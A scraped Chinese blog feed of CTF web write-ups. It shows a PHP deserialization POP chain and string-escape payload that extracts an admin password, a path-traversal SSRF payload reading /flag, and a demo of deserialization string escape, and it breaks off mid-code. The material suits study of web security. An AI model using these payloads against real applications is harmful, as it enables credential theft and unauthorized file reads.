class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-comment">// user类 </span><br><span class="hljs-comment">// 把类当成字符串使用时触发，返回值需要为字符串</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;nickname-&gt;update(<span class="hljs-keyword">$this</span>-&gt;age);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;0-0&quot;</span>;<br>    &#125;<br><br><span class="hljs-comment">// 这里user类中调用了Info类中不存在的update函数，因此这里会自动调用__call()函数</span><br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dbCtrl</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> $hostname=<span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br>    <span class="hljs-keyword">public</span> $dbuser=<span class="hljs-string">&quot;root&quot;</span>;<br>    <span class="hljs-keyword">public</span> $dbpass=<span class="hljs-string">&quot;root&quot;</span>;<br>    <span class="hljs-keyword">public</span> $database=<span class="hljs-string">&quot;test&quot;</span>;<br>    <span class="hljs-keyword">public</span> $name;<br>    <span class="hljs-keyword">public</span> $password;<br>    <span class="hljs-keyword">public</span> $mysqli;<br>    <span class="hljs-keyword">public</span> $token;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;name=$_POST[<span class="hljs-string">&#x27;username&#x27;</span>];<br>        <span class="hljs-keyword">$this</span>-&gt;password=$_POST[<span class="hljs-string">&#x27;password&#x27;</span>];<br>        <span class="hljs-keyword">$this</span>-&gt;token=$_SESSION[<span class="hljs-string">&#x27;token&#x27;</span>];<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params">$sql</span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;mysqli=<span class="hljs-keyword">new</span> mysqli(<span class="hljs-keyword">$this</span>-&gt;hostname, <span class="hljs-keyword">$this</span>-&gt;dbuser, <span class="hljs-keyword">$this</span>-&gt;dbpass, <span class="hljs-keyword">$this</span>-&gt;database);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;连接失败，错误:&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;mysqli-&gt;connect_error);<br>        &#125;<br>        $result=<span class="hljs-keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);<br>        $result-&gt;bind_param(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-keyword">$this</span>-&gt;name);<br>        $result-&gt;execute();<br>        $result-&gt;bind_result($idResult, $passwordResult);<br>        $result-&gt;fetch();<br>        $result-&gt;close();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;token==<span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">return</span> $idResult;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!$idResult) &#123;<br>            <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;用户不存在!&#x27;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (md5(<span class="hljs-keyword">$this</span>-&gt;password)!==$passwordResult) &#123;<br>            <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;密码错误！&#x27;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        $_SESSION[<span class="hljs-string">&#x27;token&#x27;</span>]=<span class="hljs-keyword">$this</span>-&gt;name;<br>        <span class="hljs-keyword">return</span> $idResult;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params">$sql</span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//还没来得及写</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">Class</span> <span class="hljs-title">UpdateHelper</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $id;<br>    <span class="hljs-keyword">public</span> $newinfo;<br>    <span class="hljs-keyword">public</span> $sql;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$newInfo,$sql</span>)</span>&#123;<br>        $newInfo=unserialize($newInfo);<br>        $upDate=<span class="hljs-keyword">new</span> dbCtrl();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;sql;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//这里如果sql为类的话就会调用user的__string()函数</span><br></code></pre></td></tr></table></figure><blockquote><p>pop 链思路 ：利用 UpdateHelper类的__destruct函数触发User类的__tostring函数再触发Info类的__call()函数</p><p>把 $this-&gt;CtrlCase实例化dbctrl 对象，再调用dbctrl类的login函数，通过查询语句把admin账户的密码查出来</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//payload</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> $id;<br>    <span class="hljs-keyword">public</span> $age = <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">public</span> $nickname = <span class="hljs-literal">null</span>;    <br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> $age;<br>    <span class="hljs-keyword">public</span> $nickname;<br>    <span class="hljs-keyword">public</span> $CtrlCase;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$age,$nickname</span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;age = $age;<br>        <span class="hljs-keyword">$this</span>-&gt;nickname = $nickname;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UpdateHelper</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> $id;<br>    <span class="hljs-keyword">public</span> $newinfo;<br>    <span class="hljs-keyword">public</span> $sql;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$newInfo,$sql</span>)</span><br><span class="hljs-function">    </span>&#123;<br>        $newInfo = unserialize($newInfo);<br>        $upDate = <span class="hljs-keyword">new</span> dbCtrl();        <br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dbCtrl</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> $hostname=<span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br>    <span class="hljs-keyword">public</span> $dbuser=<span class="hljs-string">&quot;root&quot;</span>;<br>    <span class="hljs-keyword">public</span> $dbpass=<span class="hljs-string">&quot;root&quot;</span>;<br>    <span class="hljs-keyword">public</span> $database=<span class="hljs-string">&quot;test&quot;</span>;<br>    <span class="hljs-keyword">public</span> $name = <span class="hljs-string">&quot;admin&quot;</span>;<br>    <span class="hljs-keyword">public</span> $password;<br>    <span class="hljs-keyword">public</span> $mysqli;<br>    <span class="hljs-keyword">public</span> $token = <span class="hljs-string">&quot;admin&quot;</span>;    <br>&#125;<br>$db = <span class="hljs-keyword">new</span> dbCtrl();<br>$user = <span class="hljs-keyword">new</span> User();<br>$info = <span class="hljs-keyword">new</span> Info(<span class="hljs-string">&quot;lcdm123&quot;</span>,<span class="hljs-string">&quot;lcdm123&quot;</span>);<br>$updatehelper = <span class="hljs-keyword">new</span> UpdateHelper(<span class="hljs-string">&quot;lcdm123&quot;</span>,<span class="hljs-string">&quot;lcdm123&quot;</span>);<br><br>$info-&gt;CtrlCase = $db;<br>$user-&gt;nickname = $info;<br>$user-&gt;age = <span class="hljs-string">&quot;select password,id from user where username=?&quot;</span>;<br>$updatehelper-&gt;sql = $user;<br><br>$realinfo = <span class="hljs-keyword">new</span> Info(<span class="hljs-string">&quot;lcdm123&quot;</span>,<span class="hljs-string">&quot;lcdm123&quot;</span>);<br>$realinfo-&gt;CtrlCase = $updatehelper;<br><span class="hljs-keyword">echo</span> serialize($realinfo);<br><br><span class="hljs-comment">//O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:7:&quot;lcdm123&quot;;s:8:&quot;nickname&quot;;s:7:&quot;lcdm123&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:7:&quot;lcdm123&quot;;s:8:&quot;nickname&quot;;s:7:&quot;lcdm123&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/12/19/N5rC6EoHx9bgWtO.png" alt="image-20201219174513688"></p><p><img src="https://i.loli.net/2020/12/19/zlhwvqRcAB9p2xX.png" alt="image-20201219175110353"></p><p>最终payload</p><p><a href="http://lcdm123.top/2020/11/30/Unctf-WEB/">序列化逃逸</a></p><blockquote><p>这样构造的原因：将之前的序列化字符串删除info的部分（因为传入参数时会自动构造info），添加（”;s:8:”CtrlCase”;）的原因是因为传入参数的时候没有CtrlCase参数，需要自己提前构造好利用php反序列化字符串逃逸的方法传入</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><span class="hljs-string">&#x27;&#x27;&#x27;unionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:7:&quot;lcdm123&quot;;s:8:&quot;nickname&quot;;s:7:&quot;lcdm123&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>传入payload，获取到密码的payload（需要手动删除后面的0-0）</p><p><img src="https://i.loli.net/2020/12/19/PphKnBU5Oof7NzD.png" alt="image-20201219181053512"></p><p>获得密码</p><p><img src="https://i.loli.net/2020/12/19/YhBUPJtlczQ8ewE.png" alt="image-20201219160536309"></p><p>登录获取flag</p><p><img src="https://i.loli.net/2020/12/19/PbarExg3MjSnufL.png" alt="image-20201219160523133"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>WriteUp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Unctf-WEB</title>
    <link href="/2020/11/30/Unctf-WEB/"/>
    <url>/2020/11/30/Unctf-WEB/</url>
    
    <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p>[TOC]</p><a id="more"></a><h3 id="easy-ssrf"><a href="#easy-ssrf" class="headerlink" title="easy_ssrf"></a>easy_ssrf</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;&lt;center&gt;&lt;strong&gt;welc0me to 2020UNCTF!!&lt;/strong&gt;&lt;/center&gt;&#x27;</span>;<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>$url = $_GET[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/unctf\.com/&#x27;</span>,$url))&#123;<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/php|file|zip|bzip|zlib|base|data/i&#x27;</span>,$url))&#123;<br>        $url=file_get_contents($url);<br>        <span class="hljs-keyword">echo</span>($url);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;error!!&#x27;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>SSRF   返回上级目录，读取文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">payload:?url=unctf.com<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../flag<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/07/GZqdMIHzobl61PX.png" alt="image-20201107151749234"></p><h3 id="easyunserializ"><a href="#easyunserializ" class="headerlink" title="easyunserializ"></a>easyunserializ</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> $uname;<br>    <span class="hljs-keyword">public</span> $password;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$uname,$password</span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;uname=$uname;<br>        <span class="hljs-keyword">$this</span>-&gt;password=$password;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-string">&#x27;easy&#x27;</span>)<br>            &#123;<br>                <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>                <span class="hljs-keyword">echo</span> $flag;    <br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;wrong password&#x27;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params">$string</span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;challenge&#x27;</span>,<span class="hljs-string">&#x27;easychallenge&#x27;</span>,$string);<br>&#125; <span class="hljs-comment"># 改变序列化中的字符</span><br><br>$uname=$_GET[<span class="hljs-number">1</span>];<br>$password=<span class="hljs-number">1</span>;<br>$ser=filter(serialize(<span class="hljs-keyword">new</span> a($uname,$password)));<br>$test=unserialize($ser);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="php反序列化字符串逃逸"><a href="#php反序列化字符串逃逸" class="headerlink" title="php反序列化字符串逃逸"></a>php反序列化字符串逃逸</h5><ul><li>序列化的特点：以 ; 为字段的分隔，以 } 为结尾，并且根据长度判断内容</li><li>超出部分不会被反序列化成功，说明反序列化的过程是有一定的识别范围的，范围之外都会被自动忽略</li><li>反序列化时长度不对应会报错</li><li>可以反序列化不存在的元素</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 过滤后字符增加时</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">lemon</span>(<span class="hljs-params">$string</span>)</span>&#123;<br>$lemon = <span class="hljs-string">&#x27;/p/i&#x27;</span>;<br><span class="hljs-keyword">return</span> preg_replace($lemon,<span class="hljs-string">&#x27;ww&#x27;</span>,$string);<br>&#125;<br>$username = $_GET[<span class="hljs-string">&#x27;a&#x27;</span>];<br>$age = <span class="hljs-string">&#x27;20&#x27;</span>;<br>$user = <span class="hljs-keyword">array</span>($username,$age);<br>var_dump(serialize($user));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><br>$r = lemon(serialize($user));<br>var_dump($r);<br>var_dump(unserialize($r));<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">#### 第一种情况</span><br>?a=apple时<br>    <br><span class="hljs-keyword">string</span>(<span class="hljs-number">35</span>) <span class="hljs-string">&quot;a:2:&#123;i:0;s:5:&quot;</span>apple<span class="hljs-string">&quot;;i:1;s:2:&quot;</span><span class="hljs-number">20</span><span class="hljs-string">&quot;;&#125;&quot;</span><br>&lt;br&gt;<br><span class="hljs-keyword">string</span>(<span class="hljs-number">37</span>) <span class="hljs-string">&quot;a:2:&#123;i:0;s:5:&quot;</span>awwwwle<span class="hljs-string">&quot;;i:1;s:2:&quot;</span><span class="hljs-number">20</span><span class="hljs-string">&quot;;&#125;&quot;</span><br><span class="hljs-keyword">bool</span>(<span class="hljs-literal">false</span>) <span class="hljs-comment">### 报错 不能反序列化</span><br><span class="hljs-comment">#### 第二种情况</span><br>   <span class="hljs-string">&quot;;i:1;s:2:&quot;</span><span class="hljs-number">20</span><span class="hljs-string">&quot;;&#125;  16个字符 </span><br><span class="hljs-string">?a=pppppppppppppppp&quot;</span>;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;20&quot;</span>;&#125;时<br>    <br><span class="hljs-keyword">string</span>(<span class="hljs-number">63</span>) <span class="hljs-string">&quot;a:2:&#123;i:0;s:32:&quot;</span>pppppppppppppppp<span class="hljs-string">&quot;;i:1;s:2:&quot;</span><span class="hljs-number">20</span><span class="hljs-string">&quot;;&#125;&quot;</span>;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;20&quot;</span>;&#125;<span class="hljs-string">&quot;</span><br><span class="hljs-string">&lt;br&gt;string(79) &quot;</span>a:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">32</span>:<span class="hljs-string">&quot;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&quot;</span>;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;20&quot;</span>;&#125;<span class="hljs-string">&quot;;i:1;s:2:&quot;</span><span class="hljs-number">20</span><span class="hljs-string">&quot;;&#125;&quot;</span><br><span class="hljs-keyword">array</span>(<span class="hljs-number">2</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">32</span>) <span class="hljs-string">&quot;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&quot;</span><br>  [<span class="hljs-number">1</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;20&quot;</span><br>&#125; <span class="hljs-comment">### 成功反序列化</span><br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 过滤后字符串减少时</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str_rep</span>(<span class="hljs-params">$string</span>)</span>&#123;<br><span class="hljs-keyword">return</span> preg_replace( <span class="hljs-string">&#x27;/lemon|shy/&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>, $string);<br>&#125;<br><br>$test[<span class="hljs-string">&#x27;name&#x27;</span>] = $_GET[<span class="hljs-string">&#x27;name&#x27;</span>];<br>$test[<span class="hljs-string">&#x27;sign&#x27;</span>] = $_GET[<span class="hljs-string">&#x27;sign&#x27;</span>]; <br>$test[<span class="hljs-string">&#x27;number&#x27;</span>] = <span class="hljs-string">&#x27;2020&#x27;</span>;<br>$tt=serialize($test);<br><span class="hljs-keyword">echo</span>($tt);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>$temp = str_rep($tt);<br><span class="hljs-keyword">echo</span>($temp);<br><span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>$fake = unserialize($temp);<br>var_dump(($fake));<br><span class="hljs-meta">?&gt;</span><br>    <span class="hljs-comment"># 